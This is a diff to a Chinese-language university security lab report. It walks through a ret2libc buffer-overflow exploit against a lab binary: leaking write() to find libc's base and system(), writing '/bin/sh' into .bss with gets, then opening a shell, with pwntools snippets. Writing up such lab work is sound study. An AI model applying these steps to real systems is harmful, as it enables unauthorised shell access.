@@ -1,4 +1,4 @@
-# 实验五：软件安全-漏洞利用实验
+# 网络安全工程 实验五：软件安全-漏洞利用实验
 
 > 李逸飞 2015010062
 
@@ -34,7 +34,7 @@ $ cat flag
 flag{Ok_yOu_get@#$_it!}
 ```
 
-攻击结果如下图所示，同时还用`uname -a`输出了目标机器的信息：
+攻击结果如下图所示，打出大量GG，同时还用`uname -a`输出了目标机器的信息：
 
 ![](fig/res.PNG)
 
@@ -154,6 +154,8 @@ canary在用gdb调试时可以观察到地址为`0xffffd59c`，内容是一个�
 
 要获取/bin/sh，还缺少两个条件，一是`system`函数地址，而是`/bin/sh`字符串（地址）。经过检查libc.so.6，发现了system，但没有/bin/sh字符串。此外`vul32`中没有加载过`system`，因此也无法直接调用`system`。
 
+#### 获取`system`
+
 但libc中各函数相对于libc的起始位置是固定的，可以用`nm -D`查看
 
 ```sh
@@ -184,4 +186,57 @@ $ nm -D libc.so.6|grep system
 
 读取返回结果时，要注意因为原程序是一个 *复读机* ，函数有一个`puts`再输出用户之前的输入，要把这部分去掉，读取返回的`write`实际地址
 
+```py
+    # GGG...
+    rc = sh.recv()
+    print 'rcv 2nd,', rc
+    # \n addr
+    rc = sh.recv()
+    print 'rcv 3rd,', rc
+    write_addr = u32(rc[1:5])   # discard '\n'
+    print "write_addr 0x%x" % write_addr
+```
 
+接着用这个地址减去`write`在libc中的偏移即可得到libc基址，再加上system偏移即为`system`地址
+
+#### 获取`/bin/sh`
+
+由于libc中没有出现/bin/sh，因此需要手动构造，但我又不想输入`shn/bi//`类似的字符，还需要自行计算地址，因此我想到可以找一段可能存在的.bss段，把/bin/sh字符串直接写进去
+
+检查`vul32.S`，恰好有一个非stdin/err/out的地址`completed`
+
+```nasm
+0804a088 <completed.7181>:
+ 804a088:	00 00                	add    %al,(%eax)
+	...
+```
+
+那么我直接使用gets函数把/bin/sh读入这个地址（`STR_ADDR`）即可
+
+```py
+    payload = flat([    \
+        'G' * 52,       \
+        gets_addr,      \
+        dovuln_addr,    \
+        STR_ADDR        \
+    ])
+```
+
+同样返回`dovuln`，进行最后一次攻击，这次直接调用`system`，把包含/bin/sh的地址作为参数传入，返回值（没用）为原`dovuln`的返回值
+
+```py
+    payload = flat([    \
+        'G' * 52,       \
+        system_addr,    \
+        VUL_RET_ADDR,   \
+        STR_ADDR        \
+    ])
+```
+
+这之后就启动了shell，只需进入`interactive()`模式即可
+
+```py
+    # got shell
+    print "now pwn"
+    sh.interactive()
+```
